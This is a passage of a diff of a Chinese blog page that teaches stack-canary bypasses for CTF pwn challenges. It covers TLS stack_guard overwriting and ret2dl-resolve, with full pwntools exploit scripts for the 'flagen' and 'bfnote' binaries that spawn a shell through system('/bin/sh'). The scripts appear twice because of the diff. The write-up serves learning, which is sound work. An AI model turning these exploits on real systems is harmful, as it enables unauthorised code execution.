-pop_2=0x08048b00
-pop_3=0x08048d8d
-bss=0x804b144+0x8
-a=0x08048F60
-read=0x080486CB
-p=process(&#39;./flagen&#39;)
-payload=p32(ret)+b&#39;h&#39;*0x55+&#39;a&#39;*8+b&#39;a&#39;*5+p32(pop_1)+p32(stack_check)
-payload+=p32(puts)+p32(pop_1)+p32(elf.got[&#39;free&#39;])
-payload+=p32(read)+p32(pop_3)+p32(bss+0x100)+p32(0x6fffffff)+p32(0xffffffff)
-payload+=p32(read)+p32(pop_3)+p32(elf.got[&#39;free&#39;])+p32(0x6fffffff)+p32(0xffffffff)
-payload+=p32(elf.plt[&#39;free&#39;])+p32(pop_1)+p32(bss+0x100)
-input(p,payload)
-change(p)
-alarm=u32(p.recv()[4:8].ljust(4,&#39;\x00&#39;))
-libc=LibcSearcher(&#39;alarm&#39;,alarm)
-system=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;system&#39;)
-malloc_hook=alarm-libc.dump(&#39;alarm&#39;)+libc.dump(&#39;__malloc_hook&#39;)
-print(&#39;malloc_hook&#39;,hex(malloc_hook))
-p.sendline(&#39;/bin/sh\x00&#39;)
-p.sendline(p32(system))
-p.interactive()
-p.close()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./flagen&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">p,<span class="built_in">input</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">input</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">up</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">low</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addprefix</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prin</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">puts=<span class="number">0x08048510</span></span><br><span class="line">ret=<span class="number">0x0804846a</span></span><br><span class="line">stack_check=<span class="number">0x0804B01C</span></span><br><span class="line">pop_1=<span class="number">0x08048481</span></span><br><span class="line">pop_2=<span class="number">0x08048b00</span></span><br><span class="line">pop_3=<span class="number">0x08048d8d</span></span><br><span class="line">bss=<span class="number">0x804b144</span>+<span class="number">0x8</span></span><br><span class="line">a=<span class="number">0x08048F60</span></span><br><span class="line">read=<span class="number">0x080486CB</span></span><br><span class="line">p=process(<span class="string">&#x27;./flagen&#x27;</span>)</span><br><span class="line">payload=p32(ret)+<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x55</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+p32(pop_1)+p32(stack_check)</span><br><span class="line">payload+=p32(puts)+p32(pop_1)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">payload+=p32(read)+p32(pop_3)+p32(bss+<span class="number">0x100</span>)+p32(<span class="number">0x6fffffff</span>)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">payload+=p32(read)+p32(pop_3)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])+p32(<span class="number">0x6fffffff</span>)+p32(<span class="number">0xffffffff</span>)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;free&#x27;</span>])+p32(pop_1)+p32(bss+<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">input</span>(p,payload)</span><br><span class="line">change(p)</span><br><span class="line">alarm=u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>,alarm)</span><br><span class="line">system=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">malloc_hook=alarm-libc.dump(<span class="string">&#x27;alarm&#x27;</span>)+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_hook&#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.sendline(p32(system))</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
 <h4 id="六、修改TSL绕过canary"><a href="#六、修改TSL绕过canary" class="headerlink" title="六、修改TSL绕过canary"></a>六、修改TSL绕过canary</h4><p>在linux下有一种线程局部存储（Tread Local Storage）机制，即TLS.<br>存储线程的一些全局变量.<br>结构：</p>
-<pre><code class="c">typedef struct  
-&#123;  
-  void *tcb;        /* Pointer to the TCB.  Not necessarily the  
-               thread descriptor used by libpthread.  */  
-  dtv_t *dtv;  
-  void *self;       /* Pointer to the thread descriptor.  */  
-  int multiple_threads;  
-  int gscope_flag;  
-  uintptr_t sysinfo;  
-  uintptr_t stack_guard;  
-  uintptr_t pointer_guard;  
-  ...  
-&#125; tcbhead_t;  
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the  </span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span>  </span><br><span class="line">  <span class="type">dtv_t</span> *dtv;  </span><br><span class="line">  <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span>  </span><br><span class="line">  <span class="type">int</span> multiple_threads;  </span><br><span class="line">  <span class="type">int</span> gscope_flag;  </span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;  </span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;  </span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  </span><br><span class="line">  ...  </span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;  </span><br></pre></td></tr></table></figure>
+
 <p>注意：结构中uintptr_t stack_guard就是canary值，利用漏洞篡改stack_guard值即可绕过canary，而gs或fs寄存器指向此结构.</p>
 <p>【bfnote】</p>
 <p>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png" alt="image-20230628102341433"></p>
@@ -494,256 +257,52 @@ p.close()
 <p>在libc地址更下位置和mmap一样同属共享映射区域，偏移相对固定.当我们malloc一个相当大的空间（此题&gt;&#x3D;0x20000），mallod就会用mmap来分配内存空间，其分配位置也会位于共享映射区域，依据mmap机制，其恰好处于tcbhead_r地址的低地址处，此时利用第二个漏洞写入可修改canary的值，从而实现绕过.<a target="_blank" rel="noopener" href="https://blog.csdn.net/wmq880204/article/details/115163244?ops_request_misc=%7B%22request_id%22:%22168792272416800213048166%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168792272416800213048166&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-115163244-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=mmap=%E5%88%86%E9%85%8D%E6%9C%BA%E5%88%B6&spm=1018.2226.3001.4187">(12条消息) Linux系统mmap内存映射机制原理_seqiqi_菠萝-琪琪的博客-CSDN博客</a></p>
 <p>（3）ret2dl-resolve机制利用（延迟绑定应用）<br>利用的两种结构<em>Sym（x86为Elf32_Sym x64为Elf64_Sym）</em>、<em>Rel（x86为Elf32_Rel x64为Elf64_Rel）</em></p>
 <p>Sym基本结构</p>
-<pre><code class="c">typedef struct
-&#123;
-  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移（4字节）
-  Elf32_Addr    st_value;　　//(4字节)
-  Elf32_Word    st_size;　　//(4字节)
-  unsigned char st_info; //对于导入函数符号而言，它是0x12(1字节)
-  unsigned char st_other;　　//(1字节)
-  Elf32_Section st_shndx;　　// (2字节)
-&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0
-</code></pre>
-<pre><code class="c">struct Elf64_Sym
-&#123;
-  Elf64_Word    st_name;   //符号名，是相对.dynstr起始的偏移(4字节）
-  unsigned char st_info;   //对于导入函数符号而言，它是0x12(1字节)
-  unsigned char st_other;  //(1字节)
-  Elf64_Section st_shndx;  //(2字节）
-  Elf64_Addr    st_value;  //(8字节)
-  Elf64_Xword   st_size;   //(8字节)
-&#125;;//对于导入函数而言，其他字段都是0
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移（4字节）</span></span><br><span class="line">  Elf32_Addr    st_value;　　<span class="comment">//(4字节)</span></span><br><span class="line">  Elf32_Word    st_size;　　<span class="comment">//(4字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12(1字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;　　<span class="comment">//(1字节)</span></span><br><span class="line">  Elf32_Section st_shndx;　　<span class="comment">// (2字节)</span></span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf64_Sym</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word    st_name;   <span class="comment">//符号名，是相对.dynstr起始的偏移(4字节）</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info;   <span class="comment">//对于导入函数符号而言，它是0x12(1字节)</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;  <span class="comment">//(1字节)</span></span><br><span class="line">  Elf64_Section st_shndx;  <span class="comment">//(2字节）</span></span><br><span class="line">  Elf64_Addr    st_value;  <span class="comment">//(8字节)</span></span><br><span class="line">  Elf64_Xword   st_size;   <span class="comment">//(8字节)</span></span><br><span class="line">&#125;;<span class="comment">//对于导入函数而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>
+
 <p>Rel基本结构</p>
-<pre><code class="c">
-typedef struct &#123;
-    Elf32_Addr        r_offset;//是got的对应的地址(4字节)
-    Elf32_Word       r_info; //(4字节),其中最低字节应该为0x7，前三个字节当做一个数字，是相对.dynsym起始的偏移的下标(即偏移还需要除以0x10)
-&#125; Elf32_Rel;
-</code></pre>
-<pre><code class="c">typedef struct &#123;
-    Elf64_Xword    r_offset;   //是got的对应的地址(8字节)
-    Elf64_Xword    r_info;     //(8字节),其中最低字节应该为0x7,前三个字节当做一个
-　　
- Elf64_Sxword r_addend; 　　//(8字节)
- 
-&#125; Elf64_Rel;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;<span class="comment">//是got的对应的地址(4字节)</span></span><br><span class="line">    Elf32_Word       r_info; <span class="comment">//(4字节),其中最低字节应该为0x7，前三个字节当做一个数字，是相对.dynsym起始的偏移的下标(即偏移还需要除以0x10)</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Xword    r_offset;   <span class="comment">//是got的对应的地址(8字节)</span></span><br><span class="line">    Elf64_Xword    r_info;     <span class="comment">//(8字节),其中最低字节应该为0x7,前三个字节当做一个</span></span><br><span class="line">　　</span><br><span class="line"> Elf64_Sxword r_addend; 　　<span class="comment">//(8字节)</span></span><br><span class="line"> </span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure>
+
+
 <p><u>一般x64选择gadget进行攻击 此题也为32位 故以下详细介绍32位使用ret2dl-resolve攻击方法</u><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png" alt="image-20230628115713705"></p>
 <p>32位延迟绑定具体流程<br>*第一个push的值实际上是对应的Rel和.dynrel的相对偏移<br> *jmp跳转到第一个第一个push偏移对应的Rel结构，取出里面的info中包含的sym结构的下标，找到对应的sym中的字符串的地址，从而解析到这个名称为该字符串的函数，将其地址写入rel第一项的地址中。此时，将栈清空到一开始push的两个值之前，从而正常执行对应的字符串的函数即可。</p>
 <p>我们的ret2dl-resolve实际上设置为.got.plt<a href="%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9B%BE%E4%B8%AD%E7%9A%840x8048450">0</a>对应的地址即可，从而他解析完成后会继续按照给定的参数执行。<br><em>tip</em><br>中间的空白，作为gap，是因为执行的时候最后有栈地址的变化，若无gap作为阻隔，可能栈的变化会覆盖掉一些重要的数据，从而导致程序崩溃，所以需要留有一定的gap作为栈空间变化的gap</p>
 <p>（4）漏洞利用<br>观察主函数发现一共进行了三次输入：<br>【1】修改canary、最终的返回地址及栈地址（可看汇编）<br>【2】伪造了一个shellcode<br>【3】使用TSL，绕过canary</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png" alt="image-20230628134309027"></p>
 <p>exp：</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25009</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./bfnote&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bfnote&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">bss_start = <span class="number">0x0804A060</span></span><br><span class="line">gap = <span class="number">0x500</span></span><br><span class="line">stack_overflow = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x3e</span> - <span class="number">0xc</span> + <span class="number">0x8</span>) + p64(bss_start + gap + <span class="number">0x4</span>)</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your description : &#x27;</span>)</span><br><span class="line">r.send(stack_overflow)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your postscript : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_sym = p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> - <span class="number">0x80482C8</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">fake_rel = p32(bss_start) + p32(<span class="number">0x7</span> + <span class="built_in">int</span>((bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> + <span class="number">0x8</span> + <span class="number">0x8</span> - <span class="number">0x080481D8</span>) / <span class="number">0x10</span>) * <span class="number">0x100</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span> * gap + p32(<span class="number">0x08048450</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span> + <span class="number">0x8</span> * <span class="number">2</span> - <span class="number">0x080483D0</span>) + p32(<span class="number">0</span>) + p32(bss_start + gap + <span class="number">0x4</span> * <span class="number">4</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;system\x00\x00&#x27;</span> + fake_rel + fake_sym)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your notebook size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0x20000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title size : &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0xf7d22714</span> - <span class="number">0xf7d01008</span> - <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;invalid ! please re-enter :\n&#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your title : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Give your note : &#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-r = remote(&quot;node4.buuoj.cn&quot;, 25009)
-#r = process(&quot;./bfnote&quot;)
-
-
-elf = ELF(&quot;./bfnote&quot;)
-#libc = ELF(&#39;./lib/i386-linux-gnu/libc.so.6&#39;)
-bss_start = 0x0804A060
-gap = 0x500
-stack_overflow = b&#39;a&#39; * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4)
- 
-r.recvuntil(&#39;Give your description : &#39;)
-r.send(stack_overflow)
-
-r.recvuntil(&#39;Give your postscript : &#39;)
-
-fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + p32(0) + p32(0) + p32(0x12)
-fake_rel = p32(bss_start) + p32(0x7 + int((bss_start + gap + 0x4 * 4 + 0x8 + 0x8 + 0x8 - 0x080481D8) / 0x10) * 0x100)
-r.send(b&#39;\x00&#39; * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) + p32(0) + p32(bss_start + gap + 0x4 * 4) + b&#39;/bin/sh\x00&#39; + b&#39;system\x00\x00&#39; + fake_rel + fake_sym)
-
-r.recvuntil(&#39;Give your notebook size : &#39;)
-r.send(str(0x20000))
-
-
-r.recvuntil(&#39;Give your title size : &#39;)
-r.send(str(0xf7d22714 - 0xf7d01008 - 16))
-
-r.recvuntil(&#39;invalid ! please re-enter :\n&#39;)
-r.send(str(4))
-
-r.recvuntil(&#39;Give your title : &#39;)
-r.send(b&#39;a&#39;)
-
-r.recvuntil(&#39;Give your note : &#39;)
-r.send(b&#39;aaaa&#39;)
-
-r.interactive()
-</code></pre>
 <p>难难难 啃啃啃<br>明天又是新的一天⭐<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yubut.github.io">yub</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/">https://yubut.github.io/2023/09/01/Canary解决姿势/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yubut.github.io" target="_blank">幻境</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87/">知识碎片</a></div><div class="post_share"><div class="social-share" data-image="/imgs/2024-10/OIP-C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/" title="C探索碎片——关键字static作用"><img class="cover" src="https://png.pngtree.com/thumb_back/fh260/back_our/20190622/ourmid/pngtree-blue-sky-free-illustration-image_221359.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">C探索碎片——关键字static作用</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/" title="C探索碎片——操作符"><img class="cover" src="https://img.tukuppt.com/bg_grid/00/04/53/G7edt37350.jpg!/fh/350" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">C探索碎片——操作符</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/" title="数据结构"><img class="cover" src="https://gd-hbimg.huaban.com/860d15845530de80118005269b1d96b4d9aa44756a834-Abxbe0_fw240webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-09</div><div class="title">数据结构</div></div></a></div><div><a href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/" title="解密系列basic"><img class="cover" src="https://images3.alphacoders.com/131/1319293.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-01</div><div class="title">解密系列basic</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yub</div><div class="author-info__description">路迟青</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yubut" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://qm.qq.com/q/Le1ZeB0K40" target="_blank" title=""><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3023536144@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.</span> <span class="toc-text">Canary解决姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81canary%E7%88%86%E7%A0%B4"><span class="toc-number">1.0.1.</span> <span class="toc-text">一、canary爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%EF%BC%88-x00%EF%BC%89%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.2.</span> <span class="toc-text">二、覆盖截断字符（\x00）获取canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.3.</span> <span class="toc-text">三、利用格式化字符串获取canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSP-Leak%E5%88%A9%E7%94%A8canary"><span class="toc-number">1.0.4.</span> <span class="toc-text">四、SSP Leak利用canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8A%AB%E6%8C%81stack-chk-fail%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2canary"><span class="toc-number">1.0.5.</span> <span 